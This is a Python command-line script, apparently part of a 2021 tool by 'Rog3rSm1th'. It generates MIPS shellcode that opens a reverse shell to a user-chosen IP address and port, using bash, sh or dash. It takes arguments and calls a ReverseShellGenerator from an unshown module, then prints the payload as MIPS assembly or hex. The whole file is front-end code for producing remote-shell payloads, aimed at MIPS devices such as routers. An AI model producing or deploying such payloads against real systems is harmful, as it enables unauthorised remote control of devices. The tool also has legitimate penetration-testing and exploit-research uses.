#!/usr/bin/env python3
#! -*- coding:utf8 -*-
#
# Copyright 2021 Rog3rSm1th
#
# A program to generate a MIPS shellcode that launches a reverse shell 
# to the IP and port you want, and using the shell you desire (sh, bash, dash)
#
# usage: main.py [-h] -i IP -p PORT -s {bash,sh,dash} -f {asm,hex}
# 

from generator import *
import argparse

parser = argparse.ArgumentParser(description='Generate a MIPS Reverse shell Shellcode !')
parser.add_argument('-i', '--ip',     required=True, help="IP Adress")
parser.add_argument('-p', '--port',   required=True, help="port")
parser.add_argument('-s', '--shell',  required=True, choices=['bash', 'sh', 'dash'], help="the shell you want")
parser.add_argument('-f', '--format', required=True, choices=['asm', 'hex'], help="print the shellcode in MIPS assembly or in hex encoding")
args = parser.parse_args()

generator = ReverseShellGenerator(args.ip, args.port, args.shell)
generator.generate_shellcode()

# If you want the assembly version of the shellcode
if args.format == 'asm':
    print(generator.get_MIPS_shellcode())
# Or the hex encoded version
else:
    print(generator.get_hex_shellcode())